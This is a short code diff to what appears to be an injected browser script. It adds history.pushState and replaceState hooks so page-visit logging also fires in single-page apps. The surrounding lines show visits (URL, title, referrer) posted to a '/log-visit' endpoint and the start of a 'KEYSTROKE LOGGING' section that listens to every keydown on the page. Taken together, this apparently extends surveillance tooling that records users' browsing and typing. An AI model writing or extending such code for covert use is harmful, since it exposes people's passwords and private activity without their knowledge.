@@ -240,6 +240,28 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         post('/log-visit', { url: location.href, title: document.title, referrer: document.referrer });
     }
 
+    // ── SPA navigation detection (React, Vue, Angular, etc.) ──
+    // Override history.pushState and replaceState to capture navigation
+    // in single-page apps that never trigger a full page reload.
+    (function patchHistory() {
+        try {
+            let lastUrl = location.href;
+            const wrap = (orig) => function(...args) {
+                const result = orig.apply(this, args);
+                if (location.href !== lastUrl) {
+                    lastUrl = location.href;
+                    setTimeout(() => logPageVisit(), 0);
+                }
+                return result;
+            };
+            history.pushState    = wrap(history.pushState);
+            history.replaceState = wrap(history.replaceState);
+            window.addEventListener('popstate', () => {
+                if (location.href !== lastUrl) { lastUrl = location.href; logPageVisit(); }
+            });
+        } catch {}
+    })();
+
     // ═══ KEYSTROKE LOGGING ════════════════════════════════════
     function initKeyLogger() {
         document.addEventListener('keydown', e => {
